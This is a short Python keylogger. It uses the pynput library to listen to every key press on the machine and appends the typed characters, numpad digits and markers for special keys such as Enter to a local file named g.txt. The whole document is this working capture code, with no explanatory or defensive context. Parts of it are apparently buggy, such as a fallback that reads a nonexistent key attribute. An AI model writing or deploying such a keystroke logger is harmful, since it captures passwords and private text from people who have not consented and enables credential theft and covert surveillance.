import pynput

keyboard = pynput.keyboard
with open("g.txt", 'a') as f:
    f.write("")

def on_press(key):
    try:
        try:
            print(key.char)
            with open("g.txt", 'a') as f:
                f.write(key.char)
        except:
            print(key.int)
            with open("g.txt", 'a') as f:
                f.write(key.int)

    except AttributeError:
        print('special key {0} pressed'.format(
            key))
        with open("g.txt", 'a') as f:
            if str(key) == "<97>":
                f.write("1")
            if str(key) == "<98>":
                f.write("2")
            if str(key) == "<99>":
                f.write("3")
            if str(key) == "<100>":
                f.write("4")
            if str(key) == "<101>":
                f.write("5")
            if str(key) == "<102>":
                f.write("6")
            if str(key) == "<103>":
                f.write("7")
            if str(key) == "<104>":
                f.write("8")
            if str(key) == "<105>":
                f.write("9")
            if str(key) == "<96>":
                f.write("0")
            if str(key) == "Key.space":
                f.write(" ")
            elif str(key) == "Key.enter":
                f.write("\t\t>>ENTER<<\n")
            else:
                f.write(f"\t>>{key}<<\t")


# Collect events until released
def work():
    with keyboard.Listener(
            on_press=on_press) as listener:
        listener.join()

    # ...or, in a non-blocking fashion:
    listener = keyboard.Listener(
        on_press=on_press)
    listener.start()

work()